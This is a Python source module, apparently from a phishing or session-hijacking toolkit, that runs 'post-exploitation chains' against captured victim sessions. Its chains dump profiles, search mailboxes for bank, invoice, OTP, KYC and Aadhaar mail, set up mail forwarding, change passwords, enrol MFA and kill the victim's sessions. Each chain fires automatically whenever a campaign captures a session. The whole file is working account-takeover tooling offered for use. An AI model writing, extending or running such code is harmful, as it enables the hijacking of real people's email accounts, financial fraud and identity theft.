"""Post-exploitation chains.

A captured session is only worth what you do with it. A chain is a named
sequence of the task runner's tasks, run in order against the vault record, with
the evidence collected per task:

    recon      prove access, dump the profile, list links
    inbox      prove access, list mailbox subjects, hunt high-value mail
    takeover   prove access, open the forwarding/app-password/MFA surfaces
    full       everything, in the order above

Two things make the output useful rather than decorative:

  * per-task reporting - each task's steps, extracted values and errors are kept,
    so a site whose UI differs shows which step failed instead of one opaque
    "done"
  * the keyword hunt - `mail-hunt` extracts the mailbox text and this module
    scans it for the terms that matter (invoice, bank, wire, OTP, KYC, password,
    reset), reporting each hit with its surrounding line

Chains do not fabricate results: a task that could not run reports its error and
the chain keeps going, and `ok` is only true when the task produced no errors.
"""
import contextlib
import re
import threading
import time

from . import session as session_mod

# ---------------------------------------------------------------- chains ----
CHAINS = {
    "recon": {
        "description": "Prove access, dump the profile, list every link",
        "tasks": ["probe", "profile", "links"],
    },
    "inbox": {
        "description": "Prove access, list mailbox subjects, hunt high-value mail",
        "tasks": ["probe", "inbox-subjects", "mail-hunt"],
    },
    "takeover": {
        "description": "Prove access, open the forwarding / app-password / MFA surfaces",
        "tasks": ["probe", "mail-forward", "app-password", "mfa-add"],
    },
    "lockout": {
        "description": "Prove access, open the active-sessions page",
        "tasks": ["probe", "sessions-kill"],
    },
    "own": {
        "description": "Take the account over: forward the mail, change the password, "
                       "open the active sessions",
        "tasks": ["probe", "forward-submit", "password-change", "sessions-kill"],
    },
    "full": {
        "description": "Everything: access, profile, inbox, hunt, takeover surfaces",
        "tasks": ["probe", "profile", "links", "inbox-subjects", "mail-hunt",
                  "mail-forward", "app-password", "mfa-add", "forward-submit",
                  "password-change", "mfa-enroll"],
    },
}

# Terms worth finding in a mailbox or a settings page. A hit is reported with the
# line it came from, never as a bare boolean.
KEYWORDS = (
    "invoice", "payment", "wire transfer", "bank", "statement", "salary",
    "payroll", "otp", "one-time", "password", "reset", "verify", "verification",
    "kyc", "aadhaar", "pan card", "tax", "refund", "security alert",
    "new device", "sign-in", "api key", "app password", "recovery",
)


def list_chains():
    """Chain names with what they do and which tasks they run."""
    return [{"name": n, "description": c["description"], "tasks": list(c["tasks"])}
            for n, c in sorted(CHAINS.items())]


def hunt(text, keywords=KEYWORDS, limit=40):
    """Find the terms that matter in an extracted page, with their lines.

    Returns a list of {keyword, line} - the line is what the operator reads, and
    a keyword that appears twice is reported twice only if the lines differ.
    """
    if not text:
        return []
    out, seen = [], set()
    lines = [ln.strip() for ln in str(text).splitlines()]
    for kw in keywords:
        pat = re.compile(re.escape(kw), re.I)
        for ln in lines:
            if not ln or len(ln) > 300:
                continue
            if pat.search(ln):
                key = (kw, ln[:200])
                if key in seen:
                    continue
                seen.add(key)
                out.append({"keyword": kw, "line": ln[:200]})
                if len(out) >= limit:
                    return out
    return out


def _token_tier(rec):
    """The session's token verdict (core/tokenintel), computed once per run."""
    if not isinstance(rec, dict) or not rec.get("tokens"):
        return {}
    try:
        from core import tokenintel
        intel = tokenintel.annotate(rec)
    except Exception:
        return {}
    return {"verdict": intel.get("replayability"), "device_bound": intel.get("device_bound"),
            "cae_capable": intel.get("cae_capable"),
            "tier0": [row["path"] for row in intel.get("tier0") or []
                      if row["verdict"] in ("open", "needs_a_call")],
            "summary": tokenintel.summary(rec), "line": tokenintel.line(rec)}


def run_chain(rec, name="recon", home="", outdir=None, headless=True, timeout=45000,
              replay=None, on_task=None, keywords=KEYWORDS):
    """Run a chain against a session record.

    Returns {chain, ok, tasks: [...], findings: [...], errors: [...], duration}.
    `ok` is true only when every task ran without an error - a partial chain says
    so instead of reporting success.
    """
    key = str(name or "").strip().lower()
    if key not in CHAINS:
        raise ValueError(f"unknown chain '{name}' (have: {', '.join(sorted(CHAINS))})")
    chain = CHAINS[key]
    started = time.time()
    results, errors, findings = [], [], []
    # pre-flight: what IS this session's token set? A chain that replays a device-bound
    # token wastes the whole run, and a chain that ignores a CAE-aware one acts on a
    # session that may already be revoked. The verdict travels with the result.
    tier = _token_tier(rec)
    if tier.get("verdict") == "not_replayable":
        findings.append({"keyword": "token-tier",
                         "line": "the captured tokens are NOT replayable from this host"
                                 + (" (device-bound)" if tier.get("device_bound") else "")
                                 + ": browser tasks will fail unless they run inside the "
                                   "captured session"})
    for task_name in chain["tasks"]:
        t0 = time.time()
        try:
            res = session_mod.run_task(rec, task_name, home=home, outdir=outdir,
                                       headless=headless, timeout=timeout, replay=replay)
        except Exception as e:                       # one bad task must not kill the chain
            res = {"task": task_name, "steps": [], "extracted": {}, "errors": [],
                   "duration": 0}
            errors.append(f"{task_name}: {type(e).__name__}: {e}")
            results.append({"task": task_name, "ok": False, "duration": 0.0,
                            "steps": 0, "extracted": {}, "errors": [f"{type(e).__name__}: {e}"]})
            if on_task:
                on_task(results[-1])
            continue
        task_errors = list(res.get("errors") or [])
        extracted = res.get("extracted") or {}
        hits = []
        if task_name == "mail-hunt":
            # the task extracted the page; the hunt turns it into findings
            page = extracted.get("mail_page") or ""
            hits = hunt(page, keywords=keywords)
            findings.extend(hits)
        if task_name in ("mail-forward", "app-password", "mfa-add", "sessions-kill",
                         "forward-submit", "password-change", "mfa-enroll"):
            page = (extracted.get("settings_page") or extracted.get("security_page")
                    or extracted.get("mfa_page") or extracted.get("sessions_page")
                    or extracted.get("forward_result") or extracted.get("password_result")
                    or extracted.get("mfa_result") or "")
            hits = hunt(page, keywords=("forward", "filter", "app password", "api key",
                                        "two-factor", "2fa", "authenticator", "device",
                                        "sign out", "revoke", "recovery", "success",
                                        "updated", "changed", "enabled"))
            findings.extend(hits)
        entry = {
            "task": task_name,
            "ok": not task_errors,
            "duration": round(time.time() - t0, 2),
            "steps": len(res.get("steps") or []),
            "extracted": {k: (v if not isinstance(v, list) else v[:5])
                          for k, v in extracted.items()},
            "errors": task_errors,
            "findings": hits,
        }
        results.append(entry)
        errors.extend(f"{task_name}: {e}" for e in task_errors)
        if on_task:
            on_task(entry)
    return {
        "chain": key,
        "description": chain["description"],
        "ok": not errors,
        "tasks": results,
        "findings": findings,
        "errors": errors,
        "token_tier": tier,
        "duration": round(time.time() - started, 2),
    }


def make_auto_notifier(base_notifier, db, name, outdir=None, on_result=None,
                       spawn=None):
    """Wrap a capture notifier so a captured session runs a chain by itself.

    The wrapper is here rather than inline in the CLI so its rules are testable:
      * only a `session` capture triggers it (a field capture has no session)
      * one run per session id, however many alerts arrive for it
      * the chain runs on its own thread, so the capture path never blocks
      * the result is reported to the operator through the same notifier

    `spawn` is injectable (tests run it synchronously); the default starts a
    daemon thread.
    """
    key = str(name or "").strip().lower()
    if key not in CHAINS:
        raise ValueError(f"unknown chain '{name}' (have: {', '.join(sorted(CHAINS))})")
    started = set()
    lock = threading.Lock()
    launch = spawn or (lambda fn: threading.Thread(target=fn, daemon=True).start())

    def _run(sid, campaign):
        """Run the chain and report the outcome either way.

        A chain that could not run at all (no browser, a dead session) is the
        case an operator most needs to hear about, so the alert is sent on the
        failure path too - an auto-chain that fails silently looks like a
        campaign that simply found nothing.
        """
        try:
            rec = db.session_get(sid) if db is not None else None
            if not rec:
                # No stored session means the alert is spurious (a stale alert after a
                # wipe), not a failed chain - so no chain alert is emitted for it. This
                # is safe because a REAL capture always has a stored record: the engine
                # no longer writes a row for a bare page view, but every path that
                # captures something (credentials, cookies, tokens, intel, a scanner
                # verdict) saves one. See tests/test_audit_fixes.py.
                return None
            res = run_chain(rec, key, outdir=outdir)
            if db is not None:
                with contextlib.suppress(Exception):
                    db.session_save(rec)
        except Exception as e:
            res = {"chain": key, "ok": False, "tasks": [], "findings": [], "duration": 0,
                   "errors": [f"{type(e).__name__}: {e}"]}
        if on_result:
            on_result(sid, res)
        if base_notifier:
            base_notifier({"type": "chain", "sid": sid, "campaign": campaign,
                           "chain": res["chain"], "ok": res["ok"],
                           "tasks": res["tasks"], "findings": res["findings"],
                           "errors": res["errors"]})
        return res

    def notify(cap):
        if base_notifier:
            base_notifier(cap)
        if str((cap or {}).get("type") or "") != "session":
            return
        sid = (cap or {}).get("sid") or (cap or {}).get("session") or ""
        if not sid:
            return
        with lock:
            if sid in started:
                return
            started.add(sid)
        launch(lambda: _run(sid, (cap or {}).get("campaign", "")))

    notify.started = started          # visible for tests and for a status view
    notify.chain = key
    return notify


def report(result, width=78):
    """Human-readable chain output for the CLI."""
    L = ["=" * width,
         f"CHAIN {result.get('chain')} - {result.get('description')}",
         "=" * width]
    for t in result.get("tasks") or []:
        mark = "ok " if t.get("ok") else "ERR"
        L.append(f"  [{mark}] {t['task']:<16} {t['steps']} step(s)  {t['duration']}s")
        for e in (t.get("errors") or [])[:3]:
            L.append(f"         error: {str(e)[:100]}")
    hits = result.get("findings") or []
    if hits:
        L.append("")
        L.append(f"-- FINDINGS ({len(hits)})")
        for h in hits[:30]:
            L.append(f"  {h['keyword']:<14} {h['line'][:110]}")
    if result.get("errors"):
        L.append("")
        L.append(f"-- {len(result['errors'])} error(s); the chain is not complete")
    L.append("=" * width)
    return "\n".join(L)
